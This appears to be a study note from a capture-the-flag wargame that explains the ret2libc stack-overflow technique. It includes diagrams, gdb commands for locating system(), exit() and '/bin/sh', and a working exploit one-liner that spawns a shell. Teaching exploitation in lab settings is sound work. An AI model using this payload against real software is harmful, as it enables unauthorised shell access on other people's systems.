# ret2libc

When NX (non-executable stack) is enabled, shellcode can't run on the stack. Instead, reuse functions already loaded in memory, specifically from libc. libc contains `system()`, which can run any command, including `/bin/sh`.

## Why does it work?

Every dynamically linked program loads libc into memory. Since ASLR is off in Rainfall, libc is always at the same address. The locations of `system()`, `exit()`, and the string `"/bin/sh"` are predictable.

## How a normal function call works

When you call `system("/bin/sh")` in C, the compiler generates:

```
push   address_of_"/bin/sh"    ← argument
call   system                   ← pushes return address, jumps to system
```

After `call`, the stack looks like:

```
┌──────────────────┐
│  "/bin/sh" addr  │  ← argument (esp + 8)
├──────────────────┤
│  return address  │  ← where system() returns to (esp + 4)
├──────────────────┤
│  system() code   │  ← ESP points here after call
└──────────────────┘
```

## How we fake it

Overflow the buffer and build this fake call frame on the stack:

```
[padding to reach return addr] + [system()] + [exit()] + ["/bin/sh" addr]
```

When the vulnerable function hits `ret`:
1. CPU pops `system()`'s address → jumps to system()
2. system() sees the stack and reads:
   - Return address = `exit()` (where to go after system finishes)
   - First argument = `"/bin/sh"` address
3. system() executes `/bin/sh` → we get a shell
4. When we exit the shell, it returns to `exit()` → clean exit (no crash)

## Step by step

### 1. Find the overflow offset

Same as buffer overflow: find how many bytes until you overwrite the return address.

```
(gdb) run < <(python -c "print('A' * 76 + 'BBBB')")
0x42424242 in ?? ()     ← offset is 76
```

### 2. Find system() address

```
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
```

### 3. Find exit() address

```
(gdb) p exit
$2 = {<text variable, no debug info>} 0xb7e5ebe0 <exit>
```

exit() serves as the return address so the program doesn't crash after system() finishes. Any address (or junk) would work, but exit() is clean.

### 4. Find "/bin/sh" string in memory

```
(gdb) find &system, +9999999, "/bin/sh"
0xb7f8cc58
```

This searches memory starting from system() for the string "/bin/sh". libc contains this string because system() uses it internally.

### 5. Build the exploit

```bash
(python -c "print('A' * 76 + '\x60\xb0\xe6\xb7' + '\xe0\xeb\xe5\xb7' + '\x58\xcc\xf8\xb7')"; cat) | ./binary
```

Each address is written in little-endian (bytes reversed).

## Stack visualization

Before overflow:
```
[buffer (64 bytes)] [padding] [saved EBP] [return addr]
```

After overflow:
```
[AAAAAA...76 bytes...AAAAAA] [system()]  [exit()]  ["/bin/sh"]
                              ↑ CPU jumps here via ret
```

system() reads the stack as if it was called normally:
```
[system code]  [exit = return addr]  ["/bin/sh" = arg1]
```

## When to use

- NX is enabled (can't execute shellcode on stack)
- ASLR is off (addresses are predictable)
- No useful function exists in the binary (unlike ret2function)
- Binary is dynamically linked (libc is loaded)

## ret2libc vs ret2function

| | ret2function | ret2libc |
|---|---|---|
| Target | Function in the binary | Function in libc |
| Requires | Useful function (e.g. run()) exists | libc loaded + ASLR off |
| Complexity | Simple, one address | Need 3 addresses |
| Example | level1 | level1 (alternative method) |
